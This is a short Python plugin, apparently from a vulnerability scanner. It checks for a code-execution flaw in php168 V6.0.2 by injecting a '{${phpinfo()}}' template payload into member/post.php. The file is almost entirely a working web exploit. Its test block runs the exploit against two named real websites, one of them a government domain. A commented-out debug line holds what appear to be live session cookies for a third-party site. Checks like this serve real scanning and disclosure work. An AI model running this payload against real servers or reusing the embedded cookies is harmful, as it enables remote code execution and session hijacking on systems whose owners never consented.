#!/usr/bin/env python
#*_* coding: utf-8 *_*

#name: php168 V6.0.2 代码执行（需登录）
#author: yichin
#refer: http://www.wooyun.org/bugs/wooyun-2010-0528

def assign(service, arg):
    if service == "php168":
        return True, arg

def audit(arg):
    #debug
    #cookie = 'USR=gdtxdwig%091%091449912547%09http%3A%2F%2Fwww.maltacn.cn%2Fmember%2Fmyarticle.php%3Fjob%3Dmyarticle%26mid%3D%26only%3D1; __utmt=1; __utma=1.1743752631.1449912368.1449912368.1449912368.1; __utmb=1.2.10.1449912368; __utmc=1; __utmz=1.1449912368.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); CNZZDATA779244=cnzz_eid%3D2056112461-1449912378-http%253A%252F%252Fwww.maltacn.cn%252F%26ntime%3D1449912378; passport=19%09wtf124270%09V1AFXlEBAwAIVFIPBggFVwQPUVJWVgQFVFcBAF0EVAA%3Dca6bb97d86; USR=gdtxdwig%091%091449912369%09http%3A%2F%2Fwww.maltacn.cn%2Flist.php%3Ffid-2-page-1.htm'
    payload = arg + 'member/post.php?only=1&showHtml_Type[bencandy][1]={${phpinfo()}}&aid=1&job=endHTML'
    code, head, res, err, _ = curl.curl2(payload)
    if code == 200 and 'PHP Version' in res:
        security_hole(payload + ': php168 code exectuion')
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('php168', 'http://www.maltacn.cn/')[1])
    audit(assign('php168', 'http://tyx.ahhuoshan.gov.cn/')[1])
    
